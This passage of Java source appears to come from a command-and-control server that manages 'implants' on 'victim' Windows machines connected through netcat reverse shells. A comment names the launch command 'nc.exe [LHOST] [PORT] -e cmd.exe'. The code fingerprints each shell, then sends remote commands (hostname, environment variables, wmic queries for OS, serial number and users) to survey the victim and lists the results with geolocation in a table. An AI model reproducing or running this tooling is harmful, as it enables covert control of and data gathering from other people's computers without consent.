		      brSocket.readLine();
		      this.myTempPath = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("wmic os get caption /value");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS = brSocket.readLine();
		      try { this.myOS = this.myOS.replace("Caption=", ""); }
		      catch (Exception e){}
		      brSocket.readLine();   //clear the buffer after the execution of the above wmic command
		      brSocket.readLine();
		      brSocket.readLine();
		      
		      
		      sendCommand_RAW_ToAgent("wmic os get CSDVersion /value");      
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();//issue command
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myServicePack = brSocket.readLine();
		      try { this.myServicePack = this.myServicePack.replace("CSDVersion=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW_ToAgent("wmic os get CountryCode /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myCountryCode = brSocket.readLine();
		      try { this.myCountryCode = this.myCountryCode.replace("CountryCode=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      sendCommand_RAW_ToAgent("wmic os get NumberOfUsers /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfUsers = brSocket.readLine();
		      try { this.myNumberOfUsers = this.myNumberOfUsers.replace("NumberOfUsers=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW_ToAgent("wmic os get Version /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myVersionNumber = brSocket.readLine();
		      try { this.myVersionNumber=this.myVersionNumber.replace("Version=", ""); }
		      catch (Exception e)      {      }
		      
		      
		      
		      
		      sendCommand_RAW_ToAgent("wmic os get SerialNumber /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySerialNumber = brSocket.readLine();
		      try { this.mySerialNumber = this.mySerialNumber.replace("SerialNumber=", ""); }
		      catch (Exception e)      {      }
		      
		      sendCommand_RAW_ToAgent("wmic os get OSArchitecture /value");
		      brSocket.readLine();
		      brSocket.readLine();   
		      brSocket.readLine();    
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Architecture = brSocket.readLine();
		      try { this.myOS_Architecture = this.myOS_Architecture.replace("OSArchitecture=", ""); } catch (Exception e) {}
		      
	      return true;
	    }
	    catch (Exception e)
	    {
	      Driver.eop("interrogateNewAgent_NETCAT", this.strMyClassName, e, e.getLocalizedMessage(), false);      
	    }
		  
		  return false;
	  }
	
	private boolean deprecated_acquireOverheadData_WINDOWS(BufferedReader brSocket, PrintWriter pwSocket)
	{
		dataAcquisitionComplete = false;
		
		try
		{
			/**
			 * HOSTNAME
			 */
			this.sendCommand_RAW_ToAgent("hostname");
			myHostName = brSocket.readLine();
			
			/**
			 * USER NAME
			 */
			this.sendCommand_RAW_ToAgent("echo %username%");
			myUserName = brSocket.readLine();			
			
			/**
			 * HOME DRIVE
			 */
			this.sendCommand_RAW_ToAgent("echo %homedrive%");
			myHomeDrive = brSocket.readLine();
			
			/**
			 * NUMBER OF PROCESSORS
			 */
			this.sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
			myNumberOfProcessors = brSocket.readLine();
			
			
			/**
			 *OS TYPE E.G. WINDOWS NT
			 */
			this.sendCommand_RAW_ToAgent("echo %OS%");
			myOS_Type = brSocket.readLine();
			
			/**
			 * PROCESSOR ARCHITECTURE
			 */
			this.sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
			myProcessorArchitecture = brSocket.readLine();
			
			/**
			 * SYSTEM ROOT
			 */
			this.sendCommand_RAW_ToAgent("echo %SystemRoot%");
			mySystemRoot = brSocket.readLine();
			
			
			/**
			 * USER DOMAIN
			 */
			this.sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
			myUserDomain = brSocket.readLine();
			
			/**
			 * USER PROFILE
			 */
			this.sendCommand_RAW_ToAgent("echo %USERPROFILE%");
			myUserProfile = brSocket.readLine();
			
			/**
			 * PATH TO TEMP
			 */
			this.sendCommand_RAW_ToAgent("echo %TEMP%");
			myTempPath = brSocket.readLine();
			
			
			/**
			 * OS
			 * 
			 * note: I'm gonna skip systeminfo for now... it takes too long
			 * 
			 * however, wmic os get is a beautiful command as well!
			 */
			this.sendCommand_RAW_ToAgent("wmic os get caption /value");
			myOS = brSocket.readLine();
			try{myOS.replace("Caption=", "");}	catch(Exception e){}
			
			/**
			 * SERVICE PACK
			 */
			this.sendCommand_RAW_ToAgent("wmic os get CSDVersion /value");
			myServicePack = brSocket.readLine();
			try{myServicePack.replace("CSDVersion=", "");}	catch(Exception e){}
			
			/**
			 * COUNTRY CODE
			 */
			this.sendCommand_RAW_ToAgent("wmic os get CountryCode /value");
			myCountryCode = brSocket.readLine();
			try{myCountryCode.replace("CountryCode=", "");}	catch(Exception e){}
			
			/**
			 * NUMBER OF USERS
			 */
			this.sendCommand_RAW_ToAgent("wmic os get NumberOfUsers /value");
			myNumberOfUsers = brSocket.readLine();
			try{myNumberOfUsers.replace("NumberOfUsers=", "");}	catch(Exception e){}
			
			/**
			 * VERSION NUMBER
			 */
			this.sendCommand_RAW_ToAgent("wmic os get Version /value");
			myVersionNumber = brSocket.readLine();
			try{myVersionNumber.replace("Version=", "");}	catch(Exception e){}
			
			/**
			 * SERIAL NUMBER
			 */
			this.sendCommand_RAW_ToAgent("wmic os get SerialNumber /value");
			mySerialNumber = brSocket.readLine();
			try{myVersionNumber.replace("SerialNumber=", "");}	catch(Exception e){}
			
			/**
			 * OS ARCHITECTURE
			 */
			this.sendCommand_RAW_ToAgent("wmic os get OSArchitecture /value");
			myOS_Architecture = brSocket.readLine();
			try{myOS_Architecture.replace("OSArchitecture=", "");}	catch(Exception e){}
			
			RelayBot_ServerSocket.updateConnectedImplants();
			
			dataAcquisitionComplete = true;
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("acquireOverheadData_WINDOWS", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		RelayBot_ServerSocket.updateConnectedImplants();
		dataAcquisitionComplete = true;
		return false;
	}
		
	
	public String getThreadID()	{ return "_" +this.getId();}
	
	public String getJListData()
	{
		try
		{
			if(myOS != null && !myOS.trim().equals(""))
			{
				//return myOS + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
				return myOS_Shortcut + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
			}
			
			else if(this.myOS_Type != null && !myOS_Type.trim().equals(""))
			{
				return myOS_Type + "_["+ this.getId() + "]_ " + myVictim_RHOST_IP;
			}
			
			return "" + this.getId() + "@" + this.myVictim_RHOST_IP;
			
		}
		catch(Exception e)
		{
			
		}
		
		return "ID: " + this.getId();
	}
	
	public String getHandShakeRowData()
	{
		try
		{
			Vector<String> vctData = this.getJTableRowData();
			String handShake = vctData.get(0);
			for(int i = 1; i < vctData.size(); i++)
			{
				handShake = Driver.delimeter_1 + vctData.get(i);
			}
			
			return handShake;
		}
		catch(Exception e)
		{
			Driver.eop("getHandShakeRowData", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		
		return "UNKNOWN";
	}
	
	public Vector<String> getJTableRowData()
	{
		try	{	vctMyRowData.clear();	} catch(Exception e){}
		
		
		if(myOS == null || myOS.trim().equals(""))
			myOS = myOS_Type;
		
		
		
		if(myImplantInitialLaunchDirectory == null || myImplantInitialLaunchDirectory.trim().equals(""))
		{
			myImplantInitialLaunchDirectory = "." + Driver.fileSeperator;
		}
		else if(!myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
		{
			try
			{
				//take the binary image name: look in the last 5 characters for the presence of a period as the extension!
				if(myImplantInitialLaunchDirectory.substring(myImplantInitialLaunchDirectory.length()-5).contains("."))
				{
					this.myBinaryFileName = myImplantInitialLaunchDirectory.substring(myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)+1);
					
					//since we were successful to extract the file name, remove it from the launch path
					myImplantInitialLaunchDirectory = myImplantInitialLaunchDirectory.substring(0,  myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator));
					
				}
			}catch(Exception e){}
			
			myImplantInitialLaunchDirectory = myImplantInitialLaunchDirectory + Driver.fileSeperator;
			
			//now set the current working directory, and remove the last file separator
			if(this.myImplantInitialLaunchDirectory != null && this.myImplantInitialLaunchDirectory.endsWith(Driver.fileSeperator))
			{
				this.myCurrentWorkingDirectory = myImplantInitialLaunchDirectory.substring(0, myImplantInitialLaunchDirectory.lastIndexOf(Driver.fileSeperator)).trim() + ">" + " ";
			}
			else
			{
				this.myCurrentWorkingDirectory = myImplantInitialLaunchDirectory.trim() + ">" + " ";
			}
									
		}
		
		
		
		if(I_am_Disconnected_From_Implant)
		{
			vctMyRowData.add(this.myDisconnectionTime);
		}
		else
		{
			vctMyRowData.add(I_have_an_important_message);
		}
		
		/**
		 * OS SHORTCUT NAME
		 */
		if((myOS_Shortcut == null || myOS_Shortcut.trim().equals("")) && myOS != null)
		{
			if(myOS.trim().toUpperCase().startsWith("MICROSOFT WINDOWS 7 PRO"))
			{
				myOS_Shortcut = "Win 7 Pro";
			}
			else
			{
				myOS_Shortcut = myOS;
			}
		}
		
		vctMyRowData.add(""+this.getId());
		vctMyRowData.add(myFullGeoData);//GeoLocation
		vctMyRowData.add(this.myImplantName);
		vctMyRowData.add(RelayBot_ServerSocket.careOfAddress);
		vctMyRowData.add(this.myImplantInitialLaunchDirectory);
		vctMyRowData.add(this.myBinaryFileName);
		vctMyRowData.add(myVictim_RHOST_IP);
		vctMyRowData.add(myHostName);
		vctMyRowData.add(myOS);
		vctMyRowData.add(myOS_Type);
		vctMyRowData.add(myUserName);
		vctMyRowData.add(myUserDomain);
		vctMyRowData.add(myTempPath);
		vctMyRowData.add(myUserProfile);
		vctMyRowData.add(myProcessorArchitecture);
		vctMyRowData.add(myNumberOfProcessors);
		vctMyRowData.add(mySystemRoot);
		vctMyRowData.add(myServicePack);
		vctMyRowData.add(myNumberOfUsers);
		vctMyRowData.add(mySerialNumber);
		vctMyRowData.add(myOS_Architecture);					
		vctMyRowData.add(myCountryCode);
		vctMyRowData.add(myHomeDrive);
		vctMyRowData.add(myVersionNumber);
		
		
		return vctMyRowData;
	}
	
	/**
	 * Return the Victim Machine connected to the implant 
	 */
	public String getRHOST_IP()	{	return myVictim_RHOST_IP;	}
	
	/**
	 * This is meant to send only one command with only one line as a response back.  If this is the case, then we will put that command here!
	 * 
	 * NOTE: the following may be very susceptible to an overflow if too much data is reported back... sorry, but I'm not going to handle 
	 * that at this time... so beware!!!  you can't say I didn't warn you!
	 * @param cmdToSend
	 * @param broadcastPane
	 * @param privatePane
	 */
	/*public void sendCommand(String cmdToSend, JPanel_TextDisplayPane broadcastPane, JPanel_TextDisplayPane privatePane)//i.e. if we want to say cmd /c ping www.google.com; this raw command is just ping www.google.com
	{
		try
		{
			this.pwOut.println(cmdToSend);
			this.pwOut.flush();
			
			String response = "";
			int val = 0;
			
			while((val = this.brIn.read(arg0)))
			
		}
		catch(Exception e)
		{
			Drivers.eop("Thread ID: " + myID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}*/
	
	public boolean sendCommand_RAW_ToAgent(String cmdToSend)//i.e. if we want to say cmd /c ping www.google.com; this raw command is just ping www.google.com
	{
		/*******************************************************************************************************************************************************
		 * SOLO, REMEMBER TO EVEN ALLOW NULL OR BLANK STRINGS TO GO FORWARD AS THIS MAY BE USED TO REFRESH THE CURRENT WORKING DIRECTORY OF THE IMPLANTS!!!!!
		 *******************************************************************************************************************************************************/
		
		try
		{				
			
			this.pwOut_ConnectedAgent.println(cmdToSend);
			this.pwOut_ConnectedAgent.flush();
			
			return true;
		}
		catch(Exception e)
		{
			Driver.eop("Thread ID: " + myThread_ID + " sendCommand_RAW", strMyClassName, e, e.getLocalizedMessage() + "...Perhaps socket is closed...", false);
		}
		
		return false;
	}
	
	public boolean closeThread()
	{
		try
		{
			//out of while loop, clean and close!
			continueRun = false;
			I_am_Disconnected_From_Implant = true;
			this.killThread = true;
			
			myDisconnectionTime = Driver.getTimeStamp_Without_Date();
			if(myDisconnectionTime == null)
			{
				myDisconnectionTime = "";
			}
			
			//clean the frames if they are indicating a private message!
			try
			{
				/*for(int i = 0; i < this.al.size(); i++)
				{
					parent.get(i).appendStatusMessageString(false, "------------>>>>>>>> DISCONNECTED FROM CLIENT @" + myDisconnectionTime);
				}*/
				
			}catch(Exception e){}
			
			try{this.tmrReadLine.stop();}catch(Exception e){}
			
			//remove myself from arraylist		
//RelayBot_ServerSocket.removeImplantThread(this, this.getId());		
		}
		catch(Exception e)
		{
			
		}
		
		return false;
	}
	
	
	
	 /**
	   * 
	   * VITAL: DO NOT CHANGE THE ORDER COMMANDS ARE ISSUED HERE
	   * IF YOU WANT TO ADD, ADD AT THE END OF THE METHOD!!!!!
	   * 
	   * This Netcat is the newer version of windows command prompt
	   * 
	   * I'm not going to program much here... as I don't expect to find this cmd.exe in the wild and since this is a POC, 
	   * I'll have to add more to these calls later
	   * 
	   * @param brSocket
	   * @return
	   */
	  public boolean interrogateNewAgent_NETCAT_OLDER(BufferedReader brSocket)
	  {		  
		  try
		  {
			//at this point, we have read the first 2 lines from the agent: "Microsoft windows [Version ...]" and "(C) Copyright..." Read the 3rd line.  This should be blank and continue from there
    		        		
    		//read the next line --> should be blank!
    		String strThirdLine = brSocket.readLine();      		
    		
    		if(strThirdLine != null && strThirdLine.trim().equals(""))
        	{
    			//yup, third line is blank, definitely appears to be nc.exe [LHOST] [PORT] -e cmd.exe
        		//Drivers.sop("Third line is blank as expected when cmd.exe is used with the implant" + " ##>Confidence level for netcat: 75% --> I am reading the final line to determine the netcat execution path");
    			Driver.sop("-->>> Almost there... Confidence level is 75% ...");
        		          		    
        		//send a blank line to see the final input provided
    			sendCommand_RAW_ToAgent("");
        		
        		//read the next line --> should be blank!
        		String strFourthLine = brSocket.readLine();          		
        		
        		if(strFourthLine != null && strFourthLine.trim().endsWith(">"))
            	{
        			//as best as we can, this is a netcat machine, indicate accordingly
            		//Drivers.sop("Final line contains search parameter \">\" which appears to be the initial launch directory of this implant. I will label this implant netcat" + " ##>Confidence level for netcat: 100% --> I am sending commands to better interrogate the system now...");
        			Driver.sop("-->>>> OK. So as best as I can tell, this is a netcat agent. I will label this implant netcat" + " -->>>> Confidence level for netcat: 100% -->>>> I am sending commands to better interrogate the system now...");
              		
            		
            		/*******************
            		 * SET IMPLANT ID
            		 *******************/
            		this.myIMPLANT_ID = Driver.IMPLANT_ID_NETCAT;
            		try{this.myImplantName = Driver.ARR_IMPLANT_NAME[myIMPLANT_ID];}catch(Exception e){this.myImplantName = "UNKNOWN";}
            		   		
            		//done!!!!!
            		//proceed to interrogate the system
            		
            		myImplantInitialLaunchDirectory = strFourthLine;
            		
            		//read final line to clear buffer
            		brSocket.readLine();
            	}
        		
        	}
    		
    		
			  this.sendCommand_RAW_ToAgent("hostname");
		      brSocket.readLine();//get rid of echoed command
		      this.myHostName = brSocket.readLine();
		      
		     
		     
		      sendCommand_RAW_ToAgent("echo %username%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserName = brSocket.readLine();      
		      
		
		      sendCommand_RAW_ToAgent("echo %homedrive%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myHomeDrive = brSocket.readLine();
		     if(myHomeDrive != null && myHomeDrive.trim().equals("%homedrive%"))
		     {
		    	 myHomeDrive = " - ";
		     }
		      
		      
		
		     sendCommand_RAW_ToAgent("echo %NUMBER_OF_PROCESSORS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myNumberOfProcessors = brSocket.readLine();
		      
		      sendCommand_RAW_ToAgent("echo %OS%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myOS_Type = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %PROCESSOR_ARCHITECTURE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myProcessorArchitecture = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %SystemRoot%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.mySystemRoot = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %USERDOMAIN%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserDomain = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %USERPROFILE%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myUserProfile = brSocket.readLine();
		
		      sendCommand_RAW_ToAgent("echo %TEMP%");
		      brSocket.readLine();
		      brSocket.readLine();
		      brSocket.readLine();
		      this.myTempPath = brSocket.readLine();
		
		    //I'm stopping here for now... more development will be needed if necessary
	    		Driver.sop("PUNT!!!  Nope. I am stopping the interrogation of this system early.  I did not expect to encounter an agent running an older version of cmd.exe and it is unclear if I can interact with wmic on the target.  If needed, contact Splinter and ask for the methods to continue the interrogation.");
	    		
	    		return true;
		      	
		      
		    
    		
	    }
	    catch (Exception e)
	    {
	      Driver.eop("interrogateNewAgent_NETCAT_OLDER", this.strMyClassName, e, e.getLocalizedMessage(), false);      
	    }
		  
		  return false;
	  }
	
	
	
	
	
}
